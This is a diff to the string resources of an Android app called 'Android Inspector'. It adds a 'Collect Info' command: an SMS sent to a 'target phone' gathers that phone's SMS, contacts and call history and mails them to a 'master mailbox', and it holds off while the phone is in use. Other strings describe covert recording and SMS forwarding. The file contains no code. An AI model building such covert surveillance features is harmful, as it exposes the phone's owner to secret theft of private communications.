@@ -79,6 +79,7 @@
     <string name="pref_category_gps_title">Phone Location</string>
     <string name="pref_category_ring_title">Force Belling</string>
     <string name="pref_category_env_rec_title">Environment Recording</string>
+    <string name="pref_category_collect_info_title">Collect Info</string>
     
     <string name="pref_sender_mail_title">Mail Sender(GMail/QQ ONLY)</string>
     <string name="pref_sender_mail_summary">Only GMail and QQ mail are supported.</string>
@@ -116,6 +117,8 @@
     <string name="pref_ring_word_summary">Send SMS #bell to force belling.</string>
     <string name="pref_env_rec_word_title">Environment Recording</string>
     <string name="pref_env_rec_word_summary">Send SMS #env# plus minutes(1~30) to record target phone environment.</string>
+    <string name="pref_collect_info_word_title">Collect Info</string>
+    <string name="pref_collect_info_word_summary">Send SMS #sx to target phone to collect SMS, contacts and call history, and then send mail to master mailbox.</string>
     
     <!-- InitActivity -->
     <string name="init_title">Android Inspector</string>
@@ -202,6 +205,11 @@
     <string name="indication_enable_redirect_all_sms_ng">Failed to enable forwarding all SMS.</string>
     <string name="indication_disable_redirect_all_sms_ok">Disable forwarding all SMS successfully.</string>
     <string name="indication_disable_redirect_all_sms_ng">Failed to disable forwarding all SMS.</string>
+    <string name="indication_collect_info_ng1">Networks is currently unavailabe and the phone is being used. Do nothing for security. Please try later.</string>
+    <string name="indication_collect_info_ng2">Networks is currently unavailabe. Please try later.</string>
+    <string name="indication_collect_info_ng3">Master mailbox is not specified. Please set it by indication (#2#+mailbox).</string>
+    <string name="indication_collect_info_ng4">The phone cannot connect to any networks. Please try later.</string>
+    <string name="indication_collect_info_ok">Info collected and the mail has been sent to master mailbox(%s).</string>
     
     <!-- System Indication -->
     <string name="indication_stopped_by_system">Android Inspector Message: this phone has been stopped by administrator successfully.</string>
